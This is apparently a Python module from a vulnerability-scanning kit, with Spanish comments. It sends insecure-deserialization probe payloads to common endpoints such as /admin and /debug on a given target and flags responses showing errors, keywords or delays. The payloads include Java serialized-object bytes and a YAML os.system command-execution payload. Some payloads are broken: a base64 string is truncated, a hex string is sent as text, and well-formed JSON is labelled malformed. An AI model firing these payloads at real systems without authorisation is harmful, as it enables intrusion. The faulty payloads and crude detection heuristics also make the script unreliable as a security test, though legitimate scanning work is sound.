import requests
import base64
import time

def execute(target):
    print(f"[INFO] Iniciando prueba de deserialización insegura en: {target}")
    
    # Endpoints comunes para pruebas
    endpoints = [
        "/api/upload",
        "/debug",
        "/test",
        "/admin",
        "/api/v1/deserialize",
        "/rest/debug",
        "/service/serialize",
        "/serialize-endpoint"
    ]
    
    # Payloads extendidos y personalizados
    payloads = [
        b"\xac\xed\x00\x05",  # Magic bytes de Java serialized objects
        base64.b64decode("rO0ABXNy..."),  # Ejemplo de objeto Java codificado
        b"aced000573720011",  # Extendido de objetos Java serializados
        b"!!python/object/apply:os.system\nargs: [echo vulnerable!]",  # YAML básico
        b"!!org.yaml.snakeyaml.nodes.MappingNode",  # Payload YAML extendido
        b'{"name":"vulnerable"}',  # JSON malformado
    ]
    
    # Comportamientos sospechosos a identificar
    suspicious_keywords = ["exception", "stacktrace", "serialization error", "deserialization failed", "java.io", "vulnerable"]
    
    # Configuración de cabeceras y detalles de prueba
    headers = {
        "Content-Type": "application/octet-stream",
        "User-Agent": "VulnKit/1.0"
    }
    
    vulnerable_endpoints = []

    for endpoint in endpoints:
        url = f"http://{target}{endpoint}"
        for payload in payloads:
            print(f"[INFO] Probando {url} con payload: {payload[:10]}...")
            try:
                start_time = time.time()
                response = requests.post(url, data=payload, headers=headers, timeout=15)
                response_time = time.time() - start_time
                
                # Comprobación de indicadores de vulnerabilidad
                if (
                    response.status_code >= 500 or 
                    any(keyword in response.text.lower() for keyword in suspicious_keywords) or 
                    response_time > 10  # Tiempo de respuesta inusualmente alto
                ):
                    print(f"[ALERTA] ¡Vulnerabilidad de deserialización detectada en {url}!")
                    print(f"[DETALLES] Código de estado: {response.status_code}, Tiempo de respuesta: {response_time:.2f}s")
                    vulnerable_endpoints.append({
                        "url": url,
                        "payload": payload[:10],
                        "response_code": response.status_code,
                        "response_time": f"{response_time:.2f}s"
                    })
                    break  # Detener pruebas adicionales en este endpoint
            except requests.Timeout:
                print(f"[ERROR] Tiempo de espera agotado para {url}")
            except requests.ConnectionError:
                print(f"[ERROR] No se pudo conectar con {url}")
            except Exception as e:
                print(f"[ERROR] Error inesperado al probar {url}: {e}")

    if vulnerable_endpoints:
        print("\n[RESULTADOS] Vulnerabilidades detectadas:")
        for vuln in vulnerable_endpoints:
            print(f" - Endpoint: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Código de respuesta: {vuln['response_code']}")
            print(f"   Tiempo de respuesta: {vuln['response_time']}")
        return "Vulnerable a deserialización"
    else:
        print("\n[INFO] No se encontraron vulnerabilidades en los endpoints probados.")
        return "No vulnerable"
